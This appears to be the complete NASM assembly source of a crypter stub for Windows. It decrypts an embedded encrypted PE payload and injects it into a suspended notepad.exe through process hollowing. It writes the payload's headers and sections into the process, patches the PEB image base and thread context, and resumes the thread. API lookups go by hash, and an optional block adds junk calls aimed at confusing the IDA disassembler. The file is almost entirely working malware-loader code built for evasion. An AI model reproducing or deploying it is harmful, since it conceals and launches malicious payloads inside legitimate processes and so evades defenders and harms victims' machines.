align 16

%include "macro.asm"

section .data
PEBASE dd RANDOM32 ; Memory offset dest PE
PEB		 dd RANDOM32 ; PEB Location
CTX		 dd RANDOM32 ; 
PIS		 dd RANDOM32 ; Process information structure  
SIS		 dd RANDOM32 ; 
RPEBASE	dd RANDOM32
PEENTRY dd RANDOM32; PE Entrypoint
PEIMAGEBASE dd RANDOM32
PIMAGEBASE dd RANDOM32
PESECTION dw RANDOM16 ; Sections Count
PEZOFIMAGE dd RANDOM32
PEZOFHEADERS dd RANDOM32 
PEOPTHEADER dd RANDOM32

FILE	db 'C:\WINDOWS\system32\notepad.exe',0
	;SIS times 0x44 db 0x0
	;PIS times 0x10 db 0x0


%include "payload.inc"
%include "hashs.inc"

BOXTEXT db "Hello World",0
BOXTITLE db "Message",0

section .text
PAYLOAD incbin  "payload.bin"

%include "bbcypher.asm"
%include "dllmgt.asm"

%define OBS ; Compiling with or without obfuscation

GLOBAL _start

; ########## MAIN PROGRAM ##############
_start:
	
	; Reserve Memory for the PE image
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_VIRTUALALLOC
	mov	ebx, dword[PELEN]
	add	ebx,0x54	; Reserve plus de place pour SIS et PIS
	invokel eax, NULL, ebx, MEM_COMMIT, PAGE_READWRITE
	mov	[PEBASE], eax ; Save memory location

	; Decipher payload
	call _bbdecypher

	mov	esi,[PEBASE]
	lodsw
	cmp	ax,'MZ'
	jne	.end
	add	esi,0x3C - 0x2 
	lodsd
	mov	esi,[PEBASE]
	add	esi,eax
	cmp	eax,0x90  ; mAXIMUM OFFEST OF pe
	ja	.end
	lodsw
	cmp	ax,'PE'		; Ready PE
	jne	.end
	add	esi, 2+2 
	lodsw	; Read Sections count
	mov	[PESECTION],ax
	add	esi, 3 * 0x4
	lodsw ; Read SizeOfOptionalHeader
	add	esi,2
	
	mov	[PEOPTHEADER],esi
	; EDI point sur MAGIC nubrer 10B
	mov	eax,[esi+IMAGE_OPTIONAL_HEADER__AddressOfEntryPoint]	
	mov	[PEENTRY],eax
	mov	eax,[esi+IMAGE_OPTIONAL_HEADER__ImageBase]
	mov	[PEIMAGEBASE],eax
	mov	eax,[esi+IMAGE_OPTIONAL_HEADER__SizeOfImage]
	mov	[PEZOFIMAGE],eax
  mov	eax,[esi+IMAGE_OPTIONAL_HEADER__SizeOfHeaders]
	mov	[PEZOFHEADERS],eax
	

	mov	ebx,[PEBASE]
	add	ebx,[PELEN]
	PIS_LEN equ 0x54
	SIS_LEN equ 0x10

	mov	[PIS],ebx
	add	ebx,0x44
	mov	[SIS],ebx
	mov	edi,ebx

	; Clear CTX memory... not required.. !!
	mov	ecx,0x54 / 4 ; (PIS_LEN + SIS_LEN) / 4
	mov	eax,0
	rep	stosd				; Clear memory array
	mov	ax,dx
	stosw			; Sauve le nombre de sections


	; Create processus
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_CREATEPROCESSA
	cmp	eax,0
	je	.end

	mov	edx,[PIS]
	mov	ebx,[SIS]
	invokel eax,FILE, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL,ebx,edx
	cmp	eax,0
	je	.end

	
	; Request memory for process Context
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_VIRTUALALLOC
	invokel eax, NULL, CTX__LEN, MEM_COMMIT, PAGE_READWRITE
	cmp eax,0
	je	.end
	mov	[CTX],eax
	
	mov	dword [eax], CONTEXT_FULL ; Set le type de context à full
	

	; Request for this new process CPU context
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_GETTHREADCONTEXT
	mov ecx,[PIS]
	mov	ecx,[ecx+PROCESS_INFORMATION__hThread]
	mov	ebx,[CTX]
	invokel eax,ecx,ebx
	cmp	eax,0
	je	.end

	mov	eax,[CTX]

	; Récupère la base addresse d'ou est lancé le PE, via le PEB du process
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_READPROCESSMEMORY
	mov ecx,[PIS]
	mov	ecx,[ecx+PROCESS_INFORMATION__hProcess]
	mov	ebx,[CTX]
	mov	ebx,[ebx+CTX__EBX]
	add	ebx,8		; Pointera sur PEB + 8
	invokel eax, ecx, ebx, RPEBASE, 4, NULL 
	cmp	eax,0
	je	.end

	; Si par malheur la Base address collision avec celle de notre PE packé on Demappe la section
	mov eax,[PEIMAGEBASE]  ; base image from PE file 
	cmp	eax,[RPEBASE]   ; 	base addresse form running PE
	jne	.bypassunmap

	; Unmap le PE si ils sont sur la meme base addresse
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_NTUNMAPVIEWOFSECTION
	mov ecx,[PIS]
	mov	ecx,[ecx+PROCESS_INFORMATION__hProcess]
	invokel eax,ecx,dword [PEIMAGEBASE]

.bypassunmap
	; Realloue la mémoire necessaire dans le procsess
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_VIRTUALALLOCEX
	mov ecx,[PIS]
	mov	ecx,[ecx+PROCESS_INFORMATION__hProcess]
	; 3000 --> MEM_COMMIT || MEM_RESERVE
	invokel eax,ecx, dword [PEIMAGEBASE],dword [PEZOFIMAGE],0x3000,PAGE_EXECUTE_READWRITE

	mov	[PIMAGEBASE],eax
	cmp	eax,0
	je	.end

	; Recopie les Headers du PE
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_WRITEPROCESSMEMORY
	mov ecx,[PIS]
	mov	ecx,[ecx+PROCESS_INFORMATION__hProcess]
	invokel eax,ecx,dword [PIMAGEBASE],dword [PEBASE],dword [PEZOFHEADERS],NULL
	cmp	eax,0
	je	.end

	; Recopie chaque section du PE
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_WRITEPROCESSMEMORY
	
	mov	ebx,[PEOPTHEADER]
	; Putain pourquoi + 4*4 de Gap ?  IMAGE_FILE_HEADER !!
	add	ebx,16 + IMAGE_OPTIONAL_HEADER__LEN + IMAGE_DATA_DIRECTORY__LEN

	dec	word [PESECTION]
.recopiesect:
	
	mov	ecx,[ebx + IMAGE_SECTION_HEADER__VirtualAddress ]
	add ecx,[PIMAGEBASE]
	
	mov	edx,[ebx + IMAGE_SECTION_HEADER__PointerToRawData ]
	add	edx,[PEBASE]
	
	mov	edi,[ebx + IMAGE_SECTION_HEADER__SizeOfRawData ]
	
	mov esi,[PIS]
	mov	esi,[esi+PROCESS_INFORMATION__hProcess]
	
	push	eax
	push	ebx		
	invokel eax,esi,ecx, edx, edi, NULL
	pop		ebx
	pop		eax

	add	ebx,IMAGE_SECTION_HEADER__LEN


	dec	word [PESECTION]
	cmp	word [PESECTION],0
	jnz	.recopiesect

	; Replace la base addresse du process dans le contexte du process 
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_WRITEPROCESSMEMORY
	
	mov esi,[PIS]
	mov	esi,[esi+PROCESS_INFORMATION__hProcess]
	
	mov ebx,[CTX]
	mov ebx,[ebx+CTX__EBX]
	add	ebx,8

	mov ecx,[PEOPTHEADER]
	mov	ecx,[ecx + IMAGE_OPTIONAL_HEADER__ImageBase ]
;	int3 

	invokel eax,esi,ebx,ecx,4,NULL	
	
	; Replace l'entry Point dans l'eax du contexte
	mov ebx,[CTX]
	mov	eax,[PEENTRY]
	add eax,[PIMAGEBASE]
		mov	[ebx+CTX__EAX],eax

	; Replace le context dans la thread
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_SETTHREADCONTEXT
	mov esi,[PIS]
	mov	esi,[esi+PROCESS_INFORMATION__hThread]
	invokel eax,esi,dword [CTX]


	; Relache la thread
	invokel _getdll,HASH_NTDLL.DLL
	invokel _getfunction, eax, HASH_NTRESUMETHREAD
	mov esi,[PIS]
	mov	esi,[esi+PROCESS_INFORMATION__hThread ]
	invokel eax,esi

	; Popup
	;invoke _MessageBoxA@16, 0, BOXTEXT, BOXTITLE, 0

	%ifdef OBS
	; Some work for IDA
	cmp	eax,RANDOM16+1	; n'arrive jamais
	jne .end
	call PAYLOAD + RANDOM8
	cmp	eax,RANDOM32+1
	jne .end
	call PAYLOAD + RANDOM8 +(EPELEN / 2)
	%endif

.end
	invoke _ExitProcess@4, NULL

	ret

